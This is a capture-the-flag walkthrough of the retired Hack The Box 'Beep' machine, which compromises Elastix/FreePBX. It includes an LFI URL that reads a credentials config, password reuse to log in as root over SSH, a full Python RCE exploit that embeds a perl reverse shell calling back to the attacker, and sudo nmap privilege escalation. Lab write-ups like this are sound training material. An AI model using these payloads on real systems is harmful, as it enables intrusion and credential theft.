![image](https://user-images.githubusercontent.com/105310322/192901694-2320674a-2c3e-418d-af30-f09dda1a7640.png)


### Tools: svwar, python

### Vulnerabilities: FreePBX/Elastix, Sudo

```console
└──╼ [★]$ nmap -A -p- -T4 -Pn 10.129.1.226
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-28 22:49 BST
Nmap scan report for 10.129.1.226
Host is up (0.0046s latency).
Not shown: 65519 closed tcp ports (conn-refused)
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp?
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN
80/tcp    open  http       Apache httpd 2.2.3
|_http-title: Did not follow redirect to https://10.129.1.226/
|_http-server-header: Apache/2.2.3 (CentOS)
110/tcp   open  pop3?
111/tcp   open  rpcbind    2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            939/udp   status
|_  100024  1            942/tcp   status
143/tcp   open  imap?
443/tcp   open  ssl/https?
|_ssl-date: 2022-09-28T21:58:17+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2017-04-07T08:22:08
|_Not valid after:  2018-04-07T08:22:08
942/tcp   open  status     1 (RPC #100024)
993/tcp   open  imaps?
995/tcp   open  pop3s?
3306/tcp  open  mysql?
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_mysql-info: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
4190/tcp  open  sieve?
4445/tcp  open  upnotifyp?
4559/tcp  open  hylafax?
5038/tcp  open  asterisk   Asterisk Call Manager 1.1
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
|_http-server-header: MiniServ/1.570
Service Info: Host: 127.0.0.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 859.21 seconds
```

We come to a webpage with not much we can do and default credentials did not work. 

![image](https://user-images.githubusercontent.com/105310322/192898911-9424ba4f-4e3c-446b-8f9b-43aa3ef1da23.png)

So I googled Elastix exploits and stumbled upon the link below. I took the LFI and put it at the end of the url.

https://www.exploit-db.com/exploits/37637

```https://10.129.1.226/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action```

It gave a bunch of output and a couple of usernames and passwords :)

AMPMGRUSER=admin #AMPMGRPASS=amp111 AMPMGRPASS=jEhdIekWmdjE

```
# This file is part of FreePBX.
#
#    FreePBX is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 2 of the License, or
#    (at your option) any later version.
#
#    FreePBX is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with FreePBX.  If not, see <http://www.gnu.org/licenses/>.
#
# This file contains settings for components of the Asterisk Management Portal
# Spaces are not allowed!
# Run /usr/src/AMP/apply_conf.sh after making changes to this file

# FreePBX Database configuration
# AMPDBHOST: Hostname where the FreePBX database resides
# AMPDBENGINE: Engine hosting the FreePBX database (e.g. mysql)
# AMPDBNAME: Name of the FreePBX database (e.g. asterisk)
# AMPDBUSER: Username used to connect to the FreePBX database
# AMPDBPASS: Password for AMPDBUSER (above)
# AMPENGINE: Telephony backend engine (e.g. asterisk)
# AMPMGRUSER: Username to access the Asterisk Manager Interface
# AMPMGRPASS: Password for AMPMGRUSER
#
AMPDBHOST=localhost
AMPDBENGINE=mysql
# AMPDBNAME=asterisk
AMPDBUSER=asteriskuser
# AMPDBPASS=amp109
AMPDBPASS=jEhdIekWmdjE
AMPENGINE=asterisk
AMPMGRUSER=admin
#AMPMGRPASS=amp111
AMPMGRPASS=jEhdIekWmdjE

# AMPBIN: Location of the FreePBX command line scripts
# AMPSBIN: Location of (root) command line scripts
#
AMPBIN=/var/lib/asterisk/bin
AMPSBIN=/usr/local/sbin

# AMPWEBROOT: Path to Apache's webroot (leave off trailing slash)
# AMPCGIBIN: Path to Apache's cgi-bin dir (leave off trailing slash)
# AMPWEBADDRESS: The IP address or host name used to access the AMP web admin
#
AMPWEBROOT=/var/www/html
AMPCGIBIN=/var/www/cgi-bin 
# AMPWEBADDRESS=x.x.x.x|hostname

# FOPWEBROOT: Path to the Flash Operator Panel webroot (leave off trailing slash)
# FOPPASSWORD: Password for performing transfers and hangups in the Flash Operator Panel
# FOPRUN: Set to true if you want FOP started by freepbx_engine (amportal_start), false otherwise
# FOPDISABLE: Set to true to disable FOP in interface and retrieve_conf.  Useful for sqlite3 
# or if you don't want FOP.
#
#FOPRUN=true
FOPWEBROOT=/var/www/html/panel
#FOPPASSWORD=passw0rd
FOPPASSWORD=jEhdIekWmdjE

# FOPSORT=extension|lastname
# DEFAULT VALUE: extension
# FOP should sort extensions by Last Name [lastname] or by Extension [extension]

# This is the default admin name used to allow an administrator to login to ARI bypassing all security.
# Change this to whatever you want, don't forget to change the ARI_ADMIN_PASSWORD as well
ARI_ADMIN_USERNAME=admin

# This is the default admin password to allow an administrator to login to ARI bypassing all security.
# Change this to a secure password.
ARI_ADMIN_PASSWORD=jEhdIekWmdjE

# AUTHTYPE=database|none
# Authentication type to use for web admininstration. If type set to 'database', the primary
# AMP admin credentials will be the AMPDBUSER/AMPDBPASS above.
AUTHTYPE=database

# AMPADMINLOGO=filename
# Defines the logo that is to be displayed at the TOP RIGHT of the admin screen. This enables
# you to customize the look of the administration screen.
# NOTE: images need to be saved in the ..../admin/images directory of your AMP install
# This image should be 55px in height
AMPADMINLOGO=logo.png

# USECATEGORIES=true|false
# DEFAULT VALUE: true
# Controls if the menu items in the admin interface are sorted by category (true), or sorted 
# alphabetically with no categories shown (false).

# AMPEXTENSIONS=extensions|deviceanduser
# Sets the extension behavior in FreePBX.  If set to 'extensions', Devices and Users are
# administered together as a unified Extension, and appear on a single page.
# If set to 'deviceanduser', Devices and Users will be administered seperately.  Devices (e.g. 
# each individual line on a SIP phone) and Users (e.g. '101') will be configured 
# independent of each other, allowing association of one User to many Devices, or allowing 
# Users to login and logout of Devices.
AMPEXTENSIONS=extensions

# ENABLECW=true|false
ENABLECW=no
# DEFAULT VALUE: true
# Enable call waiting by default when an extension is created. Set to 'no' to if you don't want 
# phones to be commissioned with call waiting already enabled. The user would then be required
# to dial the CW feature code (*70 default) to enable their phone. Most installations should leave
# this alone. It allows multi-line phones to receive multiple calls on their line appearances.

# CWINUSEBUSY=true|false
# DEFAULT VALUE: true
# For extensions that have CW enabled, report unanswered CW calls as 'busy' (resulting in busy 
# voicemail greeting). If set to no, unanswered CW calls simply report as 'no-answer'.

# AMPBADNUMBER=true|false
# DEFAULT VALUE: true
# Generate the bad-number context which traps any bogus number or feature code and plays a
# message to the effect. If you use the Early Dial feature on some Grandstream phones, you
# will want to set this to false.

# AMPBACKUPSUDO=true|false
# DEFAULT VALUE: false
# This option allows you to use sudo when backing up files. Useful ONLY when using AMPPROVROOT
# Allows backup and restore of files specified in AMPPROVROOT, based on permissions in /etc/sudoers
# for example, adding the following to sudoers would allow the user asterisk to run tar on ANY file
# on the system:
#	asterisk localhost=(root)NOPASSWD: /bin/tar
#	Defaults:asterisk !requiretty
# PLEASE KEEP IN MIND THE SECURITY RISKS INVOLVED IN ALLOWING THE ASTERISK USER TO TAR/UNTAR ANY FILE

# CUSTOMASERROR=true|false
# DEFAULT VALUE: true
# If false, then the Destination Registry will not report unknown destinations as errors. This should be
# left to the default true and custom destinations should be moved into the new custom apps registry.

# DYNAMICHINTS=true|false
# DEFAULT VALUE: false
# If true, Core will not statically generate hints, but instead make a call to the AMPBIN php script, 
# and generate_hints.php through an Asterisk's #exec call. This requires Asterisk.conf to be configured 
# with "execincludes=yes" set in the [options] section.

# XTNCONFLICTABORT=true|false
# BADDESTABORT=true|false
# DEFAULT VALUE: false
# Setting either of these to true will result in retrieve_conf aborting during a reload if an extension
# conflict is detected or a destination is detected. It is usually better to allow the reload to go
# through and then correct the problem but these can be set if a more strict behavior is desired.

# SERVERINTITLE=true|false
# DEFAULT VALUE: false
# Precede browser title with the server name.

# USEDEVSTATE = true|false
# DEFAULT VALUE: false
# If this is set, it assumes that you are running Asterisk 1.4 or higher and want to take advantage of the
# func_devstate.c backport available from Asterisk 1.6. This allows custom hints to be created to support
# BLF for server side feature codes such as daynight, followme, etc.

# MODULEADMINWGET=true|false
# DEFAULT VALUE: false
# Module Admin normally tries to get its online information through direct file open type calls to URLs that
# go back to the freepbx.org server. If it fails, typically because of content filters in firewalls that
# don't like the way PHP formats the requests, the code will fall back and try a wget to pull the information.
# This will often solve the problem. However, in such environment there can be a significant timeout before
# the failed file open calls to the URLs return and there are often 2-3 of these that occur. Setting this
# value will force FreePBX to avoid the attempt to open the URL and go straight to the wget calls.

# AMPDISABLELOG=true|false
# DEFAULT VALUE: true
# Whether or not to invoke the FreePBX log facility

# AMPSYSLOGLEVEL=LOG_EMERG|LOG_ALERT|LOG_CRIT|LOG_ERR|LOG_WARNING|LOG_NOTICE|LOG_INFO|LOG_DEBUG|LOG_SQL|SQL
# DEFAULT VALUE: LOG_ERR
# Where to log if enabled, SQL, LOG_SQL logs to old MySQL table, others are passed to syslog system to
# determine where to log

# AMPENABLEDEVELDEBUG=true|false
# DEFAULT VALUE: false
# Whether or not to include log messages marked as 'devel-debug' in the log system

# AMPMPG123=true|false 
# DEFAULT VALUE: true
# When set to false, the old MoH behavior is adopted where MP3 files can be loaded and WAV files converted
# to MP3. The new default behavior assumes you have mpg123 loaded as well as sox and will convert MP3 files
# to WAV. This is highly recommended as MP3 files heavily tax the system and can cause instability on a busy
# phone system.

# CDR DB Settings: Only used if you don't use the default values provided by FreePBX.
# CDRDBHOST: hostname of db server if not the same as AMPDBHOST
# CDRDBPORT: Port number for db host 
# CDRDBUSER: username to connect to db with if it's not the same as AMPDBUSER
# CDRDBPASS: password for connecting to db if it's not the same as AMPDBPASS
# CDRDBNAME: name of database used for cdr records
# CDRDBTYPE: mysql or postgres mysql is default
# CDRDBTABLENAME: Name of the table in the db where the cdr is stored cdr is default 

# AMPVMUMASK=mask 
# DEFAULT VALUE: 077 
# Defaults to 077 allowing only the asterisk user to have any permission on VM files. If set to something
# like 007, it would allow the group to have permissions. This can be used if setting apache to a different
# user then asterisk, so that the apache user (and thus ARI) can have access to read/write/delete the
# voicemail files. If changed, some of the voicemail directory structures may have to be manually changed.

# DASHBOARD_STATS_UPDATE_TIME=integer_seconds
# DEFAULT VALUE: 6
# DASHBOARD_INFO_UPDATE_TIME=integer_seconds
# DEFAULT VALUE: 20
# These can be used to change the refresh rate of the System Status Panel. Most of
# the stats are updated based on the STATS interval but a few items are checked
# less frequently (such as Asterisk Uptime) based on the INFO value

# ZAP2DAHDICOMPAT=true|false
ZAP2DAHDICOMPAT=true
# DEFAULT VALUE: false
# If set to true, FreePBX will check if you have chan_dadhi installed. If so, it will
# automatically use all your ZAP configuration settings (devices and trunks) and
# silently convert them, under the covers, to DAHDI so no changes are needed. The
# GUI will continue to refer to these as ZAP but it will use the proper DAHDI channels.
# This will also keep Zap Channel DIDs working.

# CHECKREFERER=true|false
# DEFAULT VALUE: true
# When set to the default value of true, all requests into FreePBX that might possibly add/edit/delete
# settings will be validated to assure the request is coming from the server. This will protect the system
# from CSRF (cross site request forgery) attacks. It will have the effect of preventing legitimately entering
# URLs that could modify settings which can be allowed by changing this field to false.

# USEQUEUESTATE=true|false
# DEFAULT VALUE: false
# Setting this flag will generate the required dialplan to integrate with the following Asterisk patch:
# https://issues.asterisk.org/view.php?id=15168
# This feature is planned for a future 1.6 release but given the existence of the patch can be used prior. Once
# the release version is known, code will be added to automatically enable this format in versions of Asterisk
# that support it.

# USEGOOGLEDNSFORENUM=true|false
# DEFAULT VALUE: false
# Setting this flag will generate the required global variable so that enumlookup.agi will use Google DNS
# 8.8.8.8 when performing an ENUM lookup. Not all DNS deals with NAPTR record, but Google does. There is a
# drawback to this as Google tracks every lookup. If you are not comfortable with this, do not enable this
# setting. Please read Google FAQ about this: http://code.google.com/speed/public-dns/faq.html#privacy

# MOHDIR=subdirectory_name
# This is the subdirectory for the MoH files/directories which is located in ASTVARLIBDIR
# if not specified it will default to mohmp3 for backward compatibility.
MOHDIR=mohmp3
# RELOADCONFIRM=true|false
# DEFAULT VALUE: true
# When set to false, will bypass the confirm on Reload Box

# FCBEEPONLY=true|false
# DEFAULT VALUE: false
# When set to true, a beep is played instead of confirmation message when activating/de-activating:
# CallForward, CallWaiting, DayNight, DoNotDisturb and FindMeFollow

# DISABLECUSTOMCONTEXTS=true|false
# DEFAULT VALUE: false
# Normally FreePBX auto-generates a custom context that may be usable for adding custom dialplan to modify the
# normal behavior of FreePBX. It takes a good understanding of how Asterisk processes these includes to use
# this and in many of the cases, there is no useful application. All includes will result in a WARNING in the
# Asterisk log if there is no context found to include though it results in no errors. If you know that you
# want the includes, you can set this to true. If you comment it out FreePBX will revert to legacy behavior
# and include the contexts.

# AMPMODULEXML lets you change the module repository that you use. By default, it
# should be set to http://mirror.freepbx.org/ - Presently, there are no third
# party module repositories.
AMPMODULEXML=http://mirror.freepbx.org/

# AMPMODULESVN is the prefix that is appended to <location> tags in the XML file.
# This should be set to http://mirror.freepbx.org/modules/
AMPMODULESVN=http://mirror.freepbx.org/modules/

AMPDBNAME=asterisk

ASTETCDIR=/etc/asterisk
ASTMODDIR=/usr/lib/asterisk/modules
ASTVARLIBDIR=/var/lib/asterisk
ASTAGIDIR=/var/lib/asterisk/agi-bin
ASTSPOOLDIR=/var/spool/asterisk
ASTRUNDIR=/var/run/asterisk
ASTLOGDIR=/var/log/asteriskSorry! Attempt to access restricted file.
```

Logging into elastix did not give anything.

Note: I did not take this route but you could login to webmin using the username root and the same password.

![image](https://user-images.githubusercontent.com/105310322/192898881-58326eb1-d87d-4efb-804c-7bfc349d541c.png)

When trying to login to SSH I had first thought that it was not possible as root, however upon further inpection I realized because this box is so old that it probably wasnt accepting my keys.

So using this link https://www.infosecmatter.com/solution-for-ssh-unable-to-negotiate-errors/ I gifured out how to fix my problem

```console
└──╼ [★]$ ssh root@10.129.1.226
Unable to negotiate with 10.129.1.226 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
```
Finally it accepted one of the keys ```diffie-hellman-group-exchange-sha1``` and we got root quick and easy!

```
└──╼ [★]$ ssh -oKexAlgorithms=+diffie-hellman-group-exchange-sha1 root@10.129.1.226
The authenticity of host '10.129.1.226 (10.129.1.226)' can't be established.
RSA key fingerprint is SHA256:Ip2MswIVDX1AIEPoLiHsMFfdg1pEJ0XXD5nFEjki/hI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.1.226' (RSA) to the list of known hosts.
root@10.129.1.226's password: 
Permission denied, please try again.
root@10.129.1.226's password: 
Last login: Tue Sep 29 12:10:12 2020

Welcome to Elastix 
----------------------------------------------------

To access your Elastix System, using a separate workstation (PC/MAC/Linux)
Open the Internet Browser using the following URL:
http://10.129.1.226

[root@beep ~]# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
[root@beep ~]# 
```

I also used another method to get root from this exploit. It was almost exactly what I needed for an RCE. Almost like it was made for this box.

https://www.exploit-db.com/exploits/18650

Before we get started it is a good idea to edit your ssl config so it doesnt mess with your exploit.

Open this file ```/etc/ssl/openssl.cnf``` and edit the lines at the bottom 

MinProtocol = None
CipherString = None

Next we need an extension to change in the exploit and by running the following command we can find some open lines.

```
└──╼ [★]$ svwar -m INVITE -e100-9999 10.129.1.226WARNING:TakeASip:using an INVITE scan on an endpoint (i.e. SIP phone) may cause it to ring and wake up people in the middle of the night
WARNING:TakeASip:extension '243' probably exists but the response is unexpected
WARNING:TakeASip:extension '368' probably exists but the response is unexpected
WARNING:TakeASip:extension '971' probably exists but the response is unexpected
^CWARNING:root:caught your control^c - quiting
+-----------+----------------+
| Extension | Authentication |
+===========+================+
| 233       | reqauth        |
+-----------+----------------+
| 243       | weird          |
+-----------+----------------+
| 368       | weird          |
+-----------+----------------+
| 971       | weird          |
+-----------+----------------+
```
After editing the exploit with our rhost,lhost,lport and extension we can set up our listner and launch it.

Note: Notice how this exploit has #commented about how to get root, which just so happens to be how what this box needs. Havent seen an HTB specific exploit on exploit.db until now.

posting link again for exploit: https://www.exploit-db.com/exploits/18650

```python
#!/usr/bin/python
############################################################
# Exploit Title: FreePBX / Elastix pre-authenticated remote code execution exploit
# Google Dork: oy vey
# Date: March 23rd, 2012
# Author: muts, SSL update by Emporeo
# Version: FreePBX 2.10.0/ 2.9.0, Elastix 2.2.0, possibly others.
# Tested on: multiple
# CVE : notyet
# Blog post : http://www.offensive-security.com/vulndev/freepbx-exploit-phone-home/ 
# Archive Url : http://www.offensive-security.com/0day/freepbx_callmenum.py.txt
############################################################
# Discovered by Martin Tschirsich
# http://seclists.org/fulldisclosure/2012/Mar/234
# http://www.exploit-db.com/exploits/18649
############################################################
import urllib
import ssl
rhost="10.129.1.226"
lhost="10.10.14.75"
lport=1234
extension="233"

ssl._create_default_https_context = ssl._create_unverified_context



# Reverse shell payload

url = 'https://'+str(rhost)+'/recordings/misc/callme_page.php?action=c&callmenum='+str(extension)+'@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22'+str(lhost)+'%3a'+str(lport)+'%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A'

urllib.urlopen(url)

# On Elastix, once we have a shell, we can escalate to root:
# root@bt:~# nc -lvp 443
# listening on [any] 443 ...
# connect to [172.16.254.223] from voip [172.16.254.72] 43415
# id
# uid=100(asterisk) gid=101(asterisk)
# sudo nmap --interactive

# Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
# Welcome to Interactive Mode -- press h <enter> for help
# nmap> !sh
# id
# uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
```
```console
┌─[us-dedivip-1]─[10.10.14.75]─[htb-0xrogue@pwnbox-base]─[~/Downloads]
└──╼ [★]$ python2.7 18650.py 
```


We get a shell as the user asterisk.

```console
└──╼ [★]$ nc -lvnp 1234
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.129.1.226.
Ncat: Connection from 10.129.1.226:50594.
python -c 'import pty; pty.spawn("/bin/bash")'
bash-3.2$ id
id
uid=100(asterisk) gid=101(asterisk)
bash-3.2$ 
```
Running sudo -l confirms the exploit that nmap is exploitable as well as a bunch of other stuff like chmod.

```
bash-3.2$ sudo -l
sudo -l
Matching Defaults entries for asterisk on this host:
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
    LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC
    LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY"

User asterisk may run the following commands on this host:
    (root) NOPASSWD: /sbin/shutdown
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/bin/yum
    (root) NOPASSWD: /bin/touch
    (root) NOPASSWD: /bin/chmod
    (root) NOPASSWD: /bin/chown
    (root) NOPASSWD: /sbin/service
    (root) NOPASSWD: /sbin/init
    (root) NOPASSWD: /usr/sbin/postmap
    (root) NOPASSWD: /usr/sbin/postfix
    (root) NOPASSWD: /usr/sbin/saslpasswd2
    (root) NOPASSWD: /usr/sbin/hardware_detector
    (root) NOPASSWD: /sbin/chkconfig
    (root) NOPASSWD: /usr/sbin/elastix-helper
bash-3.2$ 
```

Run the commands(You can find these on GTFO bins) and we have root and the flags!

```
bash-3.2$ sudo nmap --interactive
sudo nmap --interactive

Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
sh-3.2# id
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
sh-3.2# 
```

```console
cat /home/fanis/user.txt
sh-3.2# cat /home/fanis/user.txt
72c*****************************
sh-3.2# cat /root/root.txt
cat /root/root.txt
36d*****************************
```

Going back to these retired machines and its wild how much easier things use to be.
